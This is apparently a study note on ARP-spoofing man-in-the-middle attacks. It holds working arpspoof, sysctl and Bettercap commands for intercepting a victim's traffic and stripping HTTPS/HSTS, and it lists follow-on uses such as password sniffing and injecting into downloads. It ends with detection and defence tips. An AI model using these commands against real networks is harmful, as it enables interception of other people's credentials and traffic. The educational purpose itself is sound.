# Man in the middle attack (by arp spoofing) 

Man in the middle attack tricks the victim's computer to believe that the hacker's computer is the router, and tricks the router to believe that the hacker's computer is the victim.


### Idealogy:
send to the victim with the arp packet: (router ip) is at (hacker's mac address), and send to the router with the arp packet: (victim ip) is at (hacker's mac address).

    Send to the victim: (router ip) is at (hacker's mac address)
    arpspoof [-i interface] [-t victim] router

    Send to the router: (victim ip) is at (hacker's mac address)
    arpspoof [-i interface] [-t router] victim

By opening forwarding, the victim's internet activity flows through the hacker, and thus it can be monitored.

    sudo sysctl net.ipv4.ip_forward=1

By not opening forwarding, the victim loses internet access.

    sudo sysctl net.ipv4.ip_forward=0
    
Bypassing https:
To bypass https, the hacker must force the connection to use http. 

However, some sites are hsts enabled, which means that only https are allowed, thus a hacker must change the url name to a different url such as facebook.corn or wwww.sites.com. 

Bettercap provides easy-to-use tool for this.

        bettercap
        net.probe on # start looking for targets
        net.show # show all discovered devices in the network
        set arp.spoof.targets <target>
        set arp.spoof.fullduplex <true> # spoof both the router and the victim
        arp.spoof on
        net.sniff on # sniff for incoming packets
        hstshijack # hijack https and hsts by the methods above.
        

### Applications:
Getting man in the middle allows dos attack, password sniffing, inject javascript in web browsers, backdoor files on the fly, etc.

### How to know if you are the victim?

Make sure you know the actual router's mac address. If your arp cache for the router has a different mac address or multiple mac addresses for one IP, then you are spoofed.
arp -a lists all arp caches in your computer

### Defend against it:
Install HTTPS EVERYWHERE (https://www.eff.org/https-everywhere). This addon forces connection to go through https, thus hackers cannot sniff for passwords.
Use a reliabe VPN, but beware that the VPN provider can theoretically monitor your data.
